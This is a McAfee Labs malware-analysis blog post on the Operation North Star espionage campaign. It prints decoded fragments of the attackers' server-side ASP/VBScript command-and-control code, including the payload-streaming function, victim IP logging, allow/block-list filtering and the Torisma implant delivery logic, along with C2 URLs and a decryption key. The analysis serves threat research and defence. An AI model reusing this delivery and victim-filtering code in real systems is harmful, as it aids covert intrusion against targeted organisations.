			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-101280 wpmm-submenu-right"><div class="menu-enterprise-category-container"><ul id="menu-enterprise-category" class="menu"><li id="menu-item-97421" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97421"><a href="/blogs/enterprise/cloud-security/">Cloud Security</a></li>
<li id="menu-item-97451" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97451"><a href="/blogs/enterprise/endpoint-security/">Endpoint Security</a></li>
<li id="menu-item-97422" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97422"><a href="/blogs/enterprise/security-operations/">Security Operations</a></li>
<li id="menu-item-97452" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97452"><a href="/blogs/enterprise/data-security/">Data Security</a></li>
<li id="menu-item-101336" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-101336"><a href="/blogs/enterprise/">All Enterprise Blogs</a></li>
</ul></div></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="wp-megamenu-item-101281" class="menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-101281  wpmm_mega_menu  wpmm-fadeindown wpmm-submenu-right"><a href="#">Corporate <b class="fa fa-angle-down"></b> </a>
<ul class="wp-megamenu-sub-menu" >
	<li id="wp-megamenu-item-5247820316200784779" class="wpmm-row wp-megamenu-item-5247820316200784779 wpmm-submenu-right">
	<ul class="wp-megamenu-sub-menu" >
		<li id="wp-megamenu-item-9.5094859786749E+18" class="wpmm-col wpmm-col-12 wp-megamenu-item-9.5094859786749E+18 wpmm-submenu-right">
		<ul class="wp-megamenu-sub-menu" >
			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-101281 wpmm-submenu-right"><div class="menu-other-blogs-container"><ul id="menu-other-blogs" class="menu"><li id="menu-item-97442" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97442"><a href="/blogs/other-blogs/executive-perspectives/">Executive Perspectives</a></li>
<li id="menu-item-97441" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-97441"><a href="/blogs/other-blogs/mcafee-labs/">McAfee Labs</a></li>
<li id="menu-item-97443" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97443"><a href="/blogs/other-blogs/life-at-mcafee/">Life at McAfee</a></li>
<li id="menu-item-97440" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97440"><a href="/blogs/other-blogs/podcast/">Podcast</a></li>
<li id="menu-item-97444" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97444"><a href="/blogs/other-blogs/mcafee-partners/">McAfee Partners</a></li>
<li id="menu-item-101340" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-101340"><a href="/blogs/other-blogs/">All Corporate Blogs</a></li>
</ul></div></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="wp-megamenu-item-101282" class="menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-101282  wpmm_dropdown_menu  wpmm-fadeindown wpmm-submenu-right"><a href="/blogs/authors/">Authors</a></li>
<li id="wp-megamenu-item-101283" class="menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-101283  wpmm_dropdown_menu  wpmm-fadeindown wpmm-submenu-right"><a href="/blogs/subscribe/">Subscribe</a></li>
<li id="wp-megamenu-item-101284" class="menu-item menu-item-type-custom menu-item-object-custom wp-megamenu-item-101284  wpmm_mega_menu  wpmm-fadeindown wpmm-submenu-right"><a href="#"><span class='wpmm-selected-icon wpmm-selected-icon-left'><i class='fa fa-globe'></i></span> <b class="fa fa-angle-down"></b> </a>
<ul class="wp-megamenu-sub-menu" >
	<li id="wp-megamenu-item-5919083795729470350" class="wpmm-row wp-megamenu-item-5919083795729470350 wpmm-submenu-right">
	<ul class="wp-megamenu-sub-menu" >
		<li id="wp-megamenu-item-1.0417351930866E+19" class="wpmm-col wpmm-col-12 wp-megamenu-item-1.0417351930866E+19 wpmm-submenu-right">
		<ul class="wp-megamenu-sub-menu" >
			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-101284 wpmm-submenu-right"><div class="menu-languages-category-container"><ul id="menu-languages-category" class="menu"><li id="menu-item-97433" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97433"><a href="/blogs/languages/italia/">Italia</a></li>
<li id="menu-item-97434" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97434"><a href="/blogs/languages/japanese/">日本語</a></li>
<li id="menu-item-97435" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97435"><a href="/blogs/languages/espanol/">Español</a></li>
<li id="menu-item-97436" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97436"><a href="/blogs/languages/francais/">Français</a></li>
<li id="menu-item-97437" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97437"><a href="/blogs/languages/german/">German</a></li>
<li id="menu-item-97438" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-97438"><a href="/blogs/languages/portugues/">Português</a></li>
<li id="menu-item-101338" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-101338"><a href="/blogs/languages/">All Language Blogs</a></li>
</ul></div></li>
		</ul>
</li>
	</ul>
</li>
</ul>
</li>
<li id="wp-megamenu-item-" class="wpmm-social-link wpmm-social-link- wp-megamenu-item-  wpmm_dropdown_menu  wpmm-fadeindown wpmm-submenu-right"><a target="_blank" ><i class=""></i></a></li>
</ul>
			</div>
		</nav>            </div>
            <div class="anchors right">
                <form role="search" method="get" class="blog-search search-form" action="https://www.mcafee.com/blogs/">
                    <button type="submit" class="search-submit"><i class="symbol-arrow-forward"></i></button>
                    <input type="search" class="search-field" placeholder="Search Blogs" value="" name="s" />


                </form>  
            </div>

        </div>
    </nav>

    <div class="wrap-section padding-top-xs"> 
        <div class="container medium">
 
        <div class="breadcrumb-container theme1">
            <ul itemscope itemtype="http://schema.org/BreadcrumbList">
                
                    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="Mcafee" href="/"><span itemprop="name">Mcafee</span></a><span class="separator">/</span><meta itemprop="position" content="1"></li>
                    
                    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="Home" href="https://www.mcafee.com/blogs"><span itemprop="name">Home</span></a><span class="separator">/</span><meta itemprop="position" content="2"></li>
                    
                    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="Other Blogs" href="/blogs/other-blogs/"><span itemprop="name">Other Blogs</span></a><span class="separator">/</span><meta itemprop="position" content="3"></li>
                    
                    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="McAfee Labs" href="/blogs/other-blogs/mcafee-labs/"><span itemprop="name">McAfee Labs</span></a><span class="separator">/</span><meta itemprop="position" content="4"></li>
                    
                    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="Operation North Star Behind The Scenes" href="#"><span itemprop="name">Operation North Star Behind The Scenes</span></a><meta itemprop="position" content="5"></li>
                                   </ul>
        </div>
        <style type="text/css">
            .breadcrumb-container {
                font-size: 13px;
            }
            .breadcrumb-container ul {
                margin: 0;
                padding: 0;
            }
            .breadcrumb-container li {
                box-sizing: unset;
                display: inline-block;
                margin: 0;
                padding: 0;
            }
            .breadcrumb-container li a {
                box-sizing: unset;
                padding: 0 10px;
            }
            .breadcrumb-container {
                font-size: 12px  !important;
                padding: 0px;
                margin: 0px;
            }
            .breadcrumb-container li a{
                color:  #c01818  !important;
                font-size:  12px  !important;
                line-height:  12px  !important;
            }
            .breadcrumb-container li .separator {
                color: #53565a  !important;
                font-size:  12px  !important;
            }
                            .breadcrumb-container li:last-child .separator {
                    display: none;
                }
                
							
							
.breadcrumb-container.theme1 li {
	margin: 0;
	padding: 0;
}							
							
.breadcrumb-container.theme1 a {
	background: ;
	display: inline-block;
	margin: 0 5px;
	padding: 5px 10px;
	text-decoration: none;
}

.breadcrumb-container{}
.breadcrumb-container ul{}
.breadcrumb-container li{}
.breadcrumb-container a{}
.breadcrumb-container .separator{}
        </style>
                </div>		 
    </div>

    <div class="wrap-section padding-small article">  
        <div class="container medium"> 
            <div class="border-line"></div>

            <div class="author-block padding-bottom-xs">
                <img class="author" src="/wp-content/uploads/2019/02/20190117_McAfee_0340_Print_Christiaan-Beek-1-300x300.jpg" />
                <div class="meta">By <a href="/blogs/author/christiaan-beek/" title="Posts by Christiaan Beek" class="author url fn" rel="author">Christiaan Beek</a> and <a href="/blogs/author/ryan-sherstobitoff/" title="Posts by Ryan Sherstobitoff" class="author url fn" rel="author">Ryan Sherstobitoff</a> on Nov 05, 2020</div>
            </div>

                    <h2>Executive Summary</h2>
<p>It is rare to be provided an inside view on how major cyber espionage campaigns are conducted within the digital realm. The only transparency afforded is a limited view of victims, a malware sample, and perhaps the IP addresses of historical command and control (C2) infrastructure.</p>
<p>The Operation North Star campaign we detailed earlier this year provided just this. This campaign used social media sites, spearphishing and weaponized documents to target employees working for organizations in the defense sector. This early analysis focused on the adversary’s initial intrusion vectors, described the first stages of how an implant was installed, and how it interacted with the Command and Control (C2) server.</p>
<p>However, that initial disclosure left gaps such as the existence of secondary payload, and additional insights into how the threat actors carried out their operations and who they targeted. The updated report takes a unique deep dive following our identification of previously undiscovered information into the backend infrastructure run by the adversaries.</p>
<p>These findings reveal a previously undiscovered secondary implant known as Torisma. However, more telling are the operational security measures that were undertaken to remain hidden on compromised systems. In particular, we saw the application of an Allow and Block list of victims to ensure the attacker’s secondary payload did not make its way to organizations that were not targeted. This tells us that certainly there has been a degree of technical innovation exhibited not only with the use of a template injection but also in the operations run by the adversary.</p>
<p>Finally, while we cannot confirm the extent of the success of the adversary’s attacks, our analysis of their C2 log files indicate that they launched attacks on IP-addresses belonging to internet service providers (ISPs) in Australia, Israel and Russia, and defense contractors based in Russia and India.</p>
<p>The findings within this report are intended to provide you, the reader, unique insights into the technology and tactics the adversary used to target and compromise systems across the globe.</p>
<h3>Compromised Site</h3>
<p>Operation North Star C2 infrastructure consisted of compromised domains in Italy and other countries. Compromised domains belonged, for example, to an apparel company, an auction house and printing company. These URLs hosted malicious DOTM files, including a malicious ASP page.</p>
<ul>
<li>hxxp://fabianiarte.com:443/uploads/docs/bae_defqa_logo.jpg</li>
<li>hxxps://fabianiarte.com/uploads/imgproject/912EC803B2CE49E4A541068D495AB570.jpg</li>
<li>https://www.fabianiarte.com/include/action/inc-controller-news.asp</li>
</ul>
<p>The domain fabianiarte.com (fabianiarte.it) was compromised to host backend server code and malicious DOTM files. This domain hosted DOTM files that were used to mimic defense contractors’ job profiles as observed in Operation North Star, but the domain also included some rudimentary backend server code that we suspect was used by the implant. Log files and copies appeared in the wild pertaining to the intrusion of this domain and provided further insight. According to our analysis of this cache of data this site was compromised to host code on 7/9/2020.</p>
<p>Two DOTM files were discovered in this cache of logs and other intrusion data. These DOTM files belong to campaigns 510 and 511 based on the hard-coded value in the malicious VB scripts.</p>
<ul>
<li>22it-34165.jpg</li>
<li>21it-23792.jpg</li>
</ul>
<p><strong>Developments in Anti-Analysis Techniques</strong></p>
<p>During our analysis we uncovered two DOTM files as part of the cache of data pertaining to the backend. In analyzing first stage implants associated with the C2 server over a period of seven months, we found that there were further attempts by the adversary to obfuscate and confuse analysts.</p>
<p>Having appeared in July, these DOTM files contained first stage implants embedded in the same location as we documented in our initial research.  However, previous implants from other malicious DOTM files were double base64 encoded and the implants themselves were not further obfuscated. However, there were some notable changes in the method that differed from those detailed in our initial research:</p>
<ul>
<li>The first stage implant that is nested in the DOTM file, is using triple base64 encoding in the Visual Basic Macro</li>
<li>The extracted DLL (desktop.dat) is packed with the Themida packer attempting to make analysis more difficult.</li>
</ul>
<p>The first stage implant extracted from the DOTM files contains an encrypted configuration file and an intermediate dropper DLL. The configuration file, once decrypted, contains information for the first stage implant. The information includes the URL for the C2 and the decryption keys for the second stage payload called “<em>Torisma</em>”.</p>
<p><img class="aligncenter size-full wp-image-108202" src="/wp-content/uploads/2020/10/Torisma.png" alt="" width="487" height="642" srcset="/wp-content/uploads/2020/10/Torisma.png 487w, /wp-content/uploads/2020/10/Torisma-228x300.png 228w, /wp-content/uploads/2020/10/Torisma-98x129.png 98w" sizes="(max-width: 487px) 100vw, 487px" /></p>
<p style="text-align: center;">Contents of decrypted configuration</p>
<p>Because the configuration file contains information on how to communicate with the C2, it also stores the parameter options (ned, gl, hl). In this case, we see an unknown fourth parameter known as nl, however it does not appear to be implemented in the server-side ASP code. It is possible that the adversary may have intended to implement it in the future.</p>
<p><img class="aligncenter size-full wp-image-108208" src="/wp-content/uploads/2020/10/nl-parameter.png" alt="" width="510" height="260" srcset="/wp-content/uploads/2020/10/nl-parameter.png 510w, /wp-content/uploads/2020/10/nl-parameter-300x153.png 300w, /wp-content/uploads/2020/10/nl-parameter-205x105.png 205w" sizes="(max-width: 510px) 100vw, 510px" /></p>
<p style="text-align: center;">Appearance of nl parameter</p>
<p>In addition, analysis of the backend components for this compromised server enables us to draw a timeline of activity on how long the attacker had access. For example, the DOTM files mentioned above were placed on the compromised C2 server in July 2020. Some of the main malicious components involved in the backend operation were installed on this server in January 2020, indicating that this C2 server had been running for seven months.</p>
<h3>Digging into the Heart of Operation North Star &#8211; Backend</h3>
<p><strong>Inc-Controller-News.ASP</strong></p>
<p>As we covered in our initial Operation North Star research, the overall attack contained a first stage implant delivered by the DOTM files. That research found specific parameters used by the implant and that were sent to the C2 server.</p>
<p>Further analysis of the implant “wsdts.db” in our case, revealed that it gathers information of the victim’s system. For example:</p>
<ul>
<li>Get system disks information</li>
<li>Get Free disk space information</li>
<li>Get Computer name and (logged in) Username</li>
<li>Process information</li>
</ul>
<p>When this information is gathered, they will be communicated towards the C2 server using the parameters (ned, gl, hl).</p>
<p>These parameters are interpreted by an obfuscated server-side ASP page, based on the values sent will depend on the actions taken upon the victim. The server-side ASP page was placed on the compromised server January 2020.</p>
<p>Additionally, based on this information the adversary is targeting Windows servers running IIS to install C2 components.</p>
<p>The server-side ASP page contains a highly obfuscated VBScript embedded that, once decoded, reveals code designed to interact with the first stage implant. The ASP page is encoded with the VBScript.Encode method resulting in obfuscated VBScript code. The first stage implant interacts with the server-side ASP page through the usage of these finite parameters.</p>
<p><img class="aligncenter size-full wp-image-108211" src="/wp-content/uploads/2020/10/encoded.png" alt="" width="678" height="95" srcset="/wp-content/uploads/2020/10/encoded.png 678w, /wp-content/uploads/2020/10/encoded-300x42.png 300w, /wp-content/uploads/2020/10/encoded-205x29.png 205w" sizes="(max-width: 678px) 100vw, 678px" /></p>
<p style="text-align: center;">Encoded VBScript</p>
<p>Once the VBScript has been decoded it reveals a rather complex set of functions. These functions lead to installing additional stage implants on the victim’s system. These implants are known as Torisma and Doris, both of which are base64 encoded. They are loaded directly into memory via a binary stream once conditions have been satisfied based on the logic contained within the script.</p>
<p><img class="aligncenter size-full wp-image-108214" src="/wp-content/uploads/2020/10/decoded.png" alt="" width="679" height="120" srcset="/wp-content/uploads/2020/10/decoded.png 679w, /wp-content/uploads/2020/10/decoded-300x53.png 300w, /wp-content/uploads/2020/10/decoded-205x36.png 205w" sizes="(max-width: 679px) 100vw, 679px" /></p>
<p style="text-align: center;">Decoded VBScript</p>
<p>The ASP server-side script contains code to create a binary stream to where we suspect the Torisma implant is written. We also discovered that the Torisma implant is embedded in the ASP page and decoding the base64 blob reveals an AES encrypted payload. This ASP page contains evidence that indicates the existence of logic that decodes this implant and deliver it to the victim.</p>
<table>
<tbody>
<tr>
<td width="342">function getbinary(sdata)</p>
<p>const adtypetext = 2</p>
<p>const adtypebinary = 1</p>
<p>dim binarystream</p>
<p>dim aa</p>
<p>aa = &#8220;adodb.stream&#8221;</p>
<p>set binarystream = createobject(aa)</p>
<p>binarystream.type = adtypetext</p>
<p>binarystream.charset = &#8220;unicode&#8221;</p>
<p>binarystream.open</p>
<p>binarystream.writetext sdata</p>
<p>binarystream.position = 0</p>
<p>binarystream.type = adtypebinary</p>
<p>binarystream.position = 2</p>
<p>getbinary = binarystream.read</p>
<p>end function</td>
</tr>
</tbody>
</table>
<p>Depending on the values sent, additional actions are performed on the targeted victim. Further analysis of the server-side script indicates that there is logic that depends on some mechanism for the actor to place a victim’s IP address in an allowed-list file. The second stage implant is not delivered to a victim unless this condition is met first. This alludes to the possibility that the actor is reviewing data on the backend and selecting victims, this is likely performed through another ASP page discovered (template-letter.asp).</p>
<p>The server-side ASP page contains code to interpret the data sent via the following parameters to execute additional code. The values to these parameters are sent by the first stage implant initially delivered by the DOTM files. These parameters were covered in our initial research, however having access to the C2 backend code reveals additional information about their true purpose.</p>
<table width="632">
<tbody>
<tr>
<td width="282"><strong>Parameter </strong></td>
<td width="350"><strong>Description</strong></td>
</tr>
<tr>
<td width="282">NED</td>
<td width="350">Campaign code embedded in DOTM Macro</td>
</tr>
<tr>
<td width="282">GL</td>
<td width="350">System Information</td>
</tr>
<tr>
<td width="282">HL</td>
<td width="350">Flag to indicate OS architecture (32 or 64 bits)</td>
</tr>
</tbody>
</table>
<p>The URL query string is sent to the C2 server in the following format.</p>
<table>
<tbody>
<tr>
<td width="623">http://hostname/inc-controller-news.asp?ned=campaigncode&amp;gl=<em>base64encodeddata&amp;hl=0</em></td>
</tr>
</tbody>
</table>
<p>Further, code exists to get the infected victim’s IP address; this information is used to check if the IP address is allowed (get the second stage) or if the IP address has been blocked (prevent second stage). As mentioned previously, the addition of the victim’s IP address into the fake MP3 files is likely performed manually through identification of incoming connections through the stage 1 implant.</p>
<table>
<tbody>
<tr>
<td width="623">function getstripaddress()</p>
<p>on error resume next</p>
<p>dim ip</p>
<p>ip = request.servervariables(&#8220;http_client_ip&#8221;)</p>
<p>if ip = &#8220;&#8221;</p>
<p>then ip = request.servervariables(&#8220;http_x_forwarded_for&#8221;)</p>
<p>if ip = &#8220;&#8221;</p>
<p>then ip = request.servervariables(&#8220;remote_addr&#8221;)</p>
<p>end if end</p>
<p>if</p>
<p>getstripaddress = ip</p>
<p>end function</td>
</tr>
</tbody>
</table>
<p>The full code of the logic gets the IP address for the connecting client machine and writing victim entries to a log file. In breaking down this code we can see different functionality is used that is most interesting. These log files are also stored within the WWW root of the compromised server based on the variable strlogpath.</p>
<p>From the below code-snippet of the vbscript, we can see that the “gl” and “hl” parameters are used to query the system information from the victim (gl) and the OS architecture (32 or 64 bits):</p>
<table>
<tbody>
<tr>
<td width="623">strinfo=replace(request.form(&#8220;gl &#8220;),&#8221;&#8221;,&#8221; + &#8220;):strosbit=replace(request.form(&#8220;hl &#8220;),&#8221;&#8221;,&#8221; + &#8220;)</td>
</tr>
</tbody>
</table>
<p><strong><em>Victim Logging</em></strong></p>
<p>The adversary keeps track of victims through logging functionality that is implemented into the server-side ASP code. Furthermore, as described above, the backend server code has the ability to perform victim logging based on first stage implant connections. This log file is stored in the WWW root directory on the compromised C2 server. The following code snippet will write data to a log file in the format [<strong><em>date, IP Address, User Agent, Campaign Code (NED), System Info (GL), OS Architecture (HL)].</em></strong></p>
<table>
<tbody>
<tr>
<td width="623">strlog = date() &amp; &#8220;&#8221; &amp; formatdatetime(now(), 4)</p>
<p>r = writeline(strlogpath, strlog)</p>
<p>r = writeline(strlogpath, stripaddr)</p>
<p>r = writeline(strlogpath, strua)</p>
<p>r = writeline(strlogpath, strcondition)</p>
<p>r = writeline(strlogpath, strinfo)</p>
<p>r = writeline(strlogpath, strosbit)</td>
</tr>
</tbody>
</table>
<p>The server-side ASP code will check whether the IP address is part of an allow-list or block-list by checking for the presence of the IP in two server-side files masquerading as MP3 files. The IP address is stored in the format of an MD5 hash, contained within the server-side code as a function to create a MD5 hash. The code is looking for these files in the WWW root of the compromised server based on the variable strWorkDir.</p>
<p>Using an ‘allow-list’ is a possible indication that it contained the list of their pre-determined targets.</p>
<table>
<tbody>
<tr>
<td width="602">strWorkDir = &#8220;C:\&#8221;:strLogPath=strWorKdir&amp;&#8221;lole3D_48_02_05.mp3&#8243;:StrWhiteFile=strWorkDir&amp;&#8221;wole3D_48_02_05.mp3 &#8220;:strBlAcKFile=strWorkDir&amp;&#8221;bole3D_48_02_05.mp3&#8221;:stripAddr=GeTStrIpAddress():strMD5IpAddr=MD5(strIpAddr):strUA=Request.serveRVariables(&#8220;HTTP_USER_AGENT &#8220;)</td>
</tr>
</tbody>
</table>
<p style="text-align: center;">IP allow-list / blocklist checking</p>
<p>For MD5 hash generation, the system appears to be using a non-standard form of hashing for the IP addresses. In most cases, the built in Microsoft cryptographic service provider would be used to generate an MD5. In this case, however, the actor chose to use a custom method instead.</p>
<p>The IP address is retrieved and hashed using this method.</p>
<table>
<tbody>
<tr>
<td width="312">stripaddr=getstripaddress()</p>
<p>strmd5ipaddr=md5(stripaddr)</td>
</tr>
</tbody>
</table>
<p>The following function (ipopk) is set to read from a file that stores hashed IPs and will be used later in a conditional block statement. The code below will open and read a file, if there is no data the flag for ipok will result in 0, if there is data then the resulting value will be 1.</p>
<table>
<tbody>
<tr>
<td width="623">function ipok(hashfile, stripaddr)</p>
<p>on error resume next</p>
<p>dim fso, fs, linedata</p>
<p>set fso = server.createobject(&#8220;scripting.filesystemobject&#8221;)</p>
<p>set fs = fso.opentextfile(hashfile, 1, true)</p>
<p>ipok = 0</p>
<p>do until fs.atendofstream</p>
<p>linedata = lcase(fs.readline)</p>
<p>if len(linedata) &gt; 0 and instr(stripaddr, linedata) then ipok = 1</p>
<p>exit do</p>
<p>end if loop</p>
<p>fs.close</p>
<p>set fs = nothing</p>
<p>end function</td>
</tr>
</tbody>
</table>
<p>The following code is the logic to determine if an infected victim should receive the Torisma implant. A series of cases are used to make the decision depending on specific conditions as depicted in the code. Below the cases are explained:</p>
<ul>
<li>If the victim&#8217;s IP-address is on the allow-list, and the OS architecture bit value is “1” (resembling 64 bits), the Torisma 64 bits version implant will be sent to the victim and in the log file the term “case_1_64” is written behind the victim, meaning 64 bit version of the Torisma implant sent.</li>
<li>Same for the second case but now for a 32-bit version OS (value 0) and the term “case_1_86” is written, meaning 32-bit implant version of torisma sent.</li>
<li>If the ip-address of the victim is on the block list with either 32/64 bit OS architecture, a non-sense payload called “doris_x86” “doris_x64” will be sent to the victim. For example, in our case this was the value for “doris_x86”: DoriS_x86=&#8221;ddddddd&#8221;</li>
<li>If condition “24” is returned from the victim, a log entry is written with value “case_3” and no implant sent and an http response status of 405 is sent</li>
<li>If neither of the above conditions are met, “case_4” is written in the log-file, no implant sent and again an http response status of 405 is sent.</li>
</ul>
<p>An http 405 response code indicates that the request method is known by the server but is not supported by the target resource.</p>
<table width="674">
<tbody>
<tr>
<td width="674">if ipok(strwhitefile, strmd5ipaddr) = 1 and instr(strosbit, &#8220;1 &#8220;) &gt; 0 then r = writeline(strlogpath, &#8220;case_1_64 &#8220;) strresdata = strbase64_torisma_x64</p>
<p>&nbsp;</p>
<p>else if ipok(strwhitefile, strmd5ipaddr) = 1 and instr(strosbit, &#8220;0 &#8220;) &gt; 0 then r = writeline(strlogpath, &#8220;case_1_86 &#8220;) strresdata = strbase64_torisma_x86</p>
<p>&nbsp;</p>
<p>else if ipok(strblackfile, strmd5ipaddr) = 1 and instr(strosbit, &#8220;1 &#8220;) &gt; 0 then r = writeline(strlogpath, &#8220;case_2_64 &#8220;) strresdata = strbase64_doris_x64</p>
<p>&nbsp;</p>
<p>else if ipok(strblackfile, strmd5ipaddr) = 1 and instr(strosbit, &#8220;0 &#8220;) &gt; 0 then r = writeline(strlogpath, &#8220;case_2_86 &#8220;) strresdata = strbase64_doris_x86</p>
<p>&nbsp;</p>
<p>else if instr(strcondition, &#8220;24 &#8220;) &gt; 0 then r = writeline(strlogpath, &#8220;case_3 &#8220;) response.status = &#8220;405&#8221;</p>
<p>else r = writeline(strlogpath, &#8220;case_4 &#8220;) response.status = &#8220;405 &#8220;end</td>
</tr>
</tbody>
</table>
<p style="text-align: center;">Logic to deliver 2<sup>nd</sup> stage implant to victim</p>
<h3>Inside the Torisma Implant</h3>
<p>One of the primary objectives of Operation North Star from what we can tell is to install the Torisma implant on the targeted victim’s system based on a set of logic. Further, the end goal is executing custom shellcode post Torisma infection, thus running custom actions depending on the specific victim profiles. As described earlier, Torisma is delivered based on data sent from the victim to the command and control server. This process relies on the first stage implant extracted from VB macro embedded in the DOTM file.</p>
<p><img class="aligncenter size-full wp-image-108187" src="/wp-content/uploads/2020/10/process-flow.png" alt="" width="629" height="391" srcset="/wp-content/uploads/2020/10/process-flow.png 629w, /wp-content/uploads/2020/10/process-flow-300x186.png 300w, /wp-content/uploads/2020/10/process-flow-205x127.png 205w" sizes="(max-width: 629px) 100vw, 629px" /></p>
<p style="text-align: center;">General process flow and component relationship</p>
<p>Further, Torisma is a previously unknown 2<sup>nd</sup> stage implant embedded in the server-side ASP page as a base64 encoded blob. Embedded is a 64 and 32-bit version and depending on the OS architecture flag value sent by the victim and will determine what version is sent. Further this implant is loaded directly into memory as a result of interaction between the victim and the command and control server. The adversary went to great lengths to obfuscate, encrypt and pack the 1<sup>st</sup> and 2<sup>nd</sup> stage implants involved in this specific case.</p>
<p>Once Torisma is decoded from Base64 the implant is further encrypted using an AES key and compressed. The server-side ASP page does not contain any logic to decrypt the Torisma implant itself, rather it relies on decryption logic contained within the first stage implant. The decryption key exists in an encrypted configuration file, along with the URL for the command and control server.</p>
<p>This makes recovery of the implant more difficult if the compromised server code were to be recovered by incident responders.</p>
<p>The decryption method is performed by the first stage implant using the decryption key stored in the configuration file, this key is a static32-bit AES key. Torisma can be decoded with a decryption key 78b81b8215f40706527ca830c34b23f7.</p>
<p>Further, after decrypting the Torisma binary, it is found to also be packed with lz4 compression giving it another layer of protection. Once decompressing the code, we are now able to analyze Torisma and its capabilities giving further insight into Operation North Star and the 2<sup>nd</sup> stage implant.</p>
<p>The variant of the implant we analyzed was created 7/2/2020; however, given that inc-controller-news.asp was placed on the C2 in early 2020, it indicates the possibility of multiple updates.</p>
<p>Based on the analysis, Torisma is sending and receiving information with the following URLs.</p>
<ul>
<li>hxxps://www.fabianiarte.com/newsletter/arte/view.asp</li>
<li>hxxps://www.commodore.com.tr/mobiquo/appExtt/notdefteri/writenote.php</li>
<li>hxxp://scimpex.com:443/admin/assets/backup/requisition/requisition.php</li>
</ul>
<p><strong>Encrypted Configuration File</strong></p>
<p>Torisma also uses encrypted configuration files just as with the 1<sup>st</sup> stage implant to indicate what URLs it communicates with as a command and control, etc.</p>
<p><img class="aligncenter size-full wp-image-108226" src="/wp-content/uploads/2020/10/config.png" alt="" width="584" height="187" srcset="/wp-content/uploads/2020/10/config.png 584w, /wp-content/uploads/2020/10/config-300x96.png 300w, /wp-content/uploads/2020/10/config-205x66.png 205w" sizes="(max-width: 584px) 100vw, 584px" /></p>
<p style="text-align: center;">Decrypted configuration file</p>
<p>The configuration file for Torisma is encrypted using the algorithm VEST<a href="#_ftn1" name="_ftnref1">[1]</a> in addition to the communication sent over the C2 channel. From our research this encryption method is not commonly used anywhere, in fact it was a proposed cipher that did not become a standard to be implemented in general technologies<a href="#_ftn2" name="_ftnref2">[2]</a>.</p>
<p>Further, the FOUND002.CHK file recovered from the backend is used to update the configuration and contains just URLs with .php extension. These URLs have pages with a .php extension, indicating that some of the backend may have been written in PHP. It’s unclear what the role of the servers with .PHP pages have in the overall attack. Though we can confirm based on strings and functions in Torisma that there is code designed to send and receive files with the page view.asp. This view.asp page is the Torisma implant backend from what our analysis shows here. Later in this analysis we cover more on view.asp, however that page contained basic functionality to handle requests, send and receive data with an infected victim that has the Torisma implant.</p>
<h3>Main Functionality</h3>
<p>According to our analysis, the Torisma code is a custom developed implant focused on specialized monitoring.</p>
<p>The role of Torisma is to monitor for new drives added to the system as well as remote desktop connections. This appears to be a more specialized implant focused on active monitoring on a victim’s system and triggering the execution of payloads based on monitored events. The end objective of Torisma is executing shellcode on the victim’s system and sending the results back to the C2.</p>
<p>The Torisma code begins by running a monitoring loop for information gathering.</p>
<p><img class="aligncenter size-full wp-image-108229" src="/wp-content/uploads/2020/10/information-gathering-loop.png" alt="" width="710" height="496" srcset="/wp-content/uploads/2020/10/information-gathering-loop.png 710w, /wp-content/uploads/2020/10/information-gathering-loop-300x210.png 300w, /wp-content/uploads/2020/10/information-gathering-loop-185x129.png 185w" sizes="(max-width: 710px) 100vw, 710px" /></p>
<p style="text-align: center;">Information gathering loop</p>
<p><strong>General Process</strong></p>
<p>It runs the monitoring routine but will first check if monitoring is enabled based on the configuration (disabled by default). The general logic of this process is as follows:</p>
<ol>
<li>If monitoring is disabled, just return</li>
<li>Else call the code that does the monitoring and upon completion temporarily disable monitoring</li>
<li>When run, the monitoring will be executed for a specified amount of time based on a configuration value</li>
<li>Upon return of the monitoring function, the code will proceed to command and control communication</li>
<li>If there is repeated failure in communication, the implant will force monitoring for 1hr and then retry the communication</li>
<li>Repeat forever</li>
</ol>
<p><img class="aligncenter size-full wp-image-108232" src="/wp-content/uploads/2020/10/monitoring.png" alt="" width="627" height="544" srcset="/wp-content/uploads/2020/10/monitoring.png 627w, /wp-content/uploads/2020/10/monitoring-300x260.png 300w, /wp-content/uploads/2020/10/monitoring-149x129.png 149w" sizes="(max-width: 627px) 100vw, 627px" /></p>
<p style="text-align: center;">Triggering monitoring based on configuration</p>
<p><strong>Monitoring</strong></p>
<p>The monitoring loop will retrieve the address of WTSEnumerateSessionsW and the local mac address using GetAdaptersInfo.</p>
<ol>
<li>The code will execute on a loop, until either enough time has elapsed (end time passed a parameter) or an event of interest occurred</li>
</ol>
<p>&nbsp;</p>
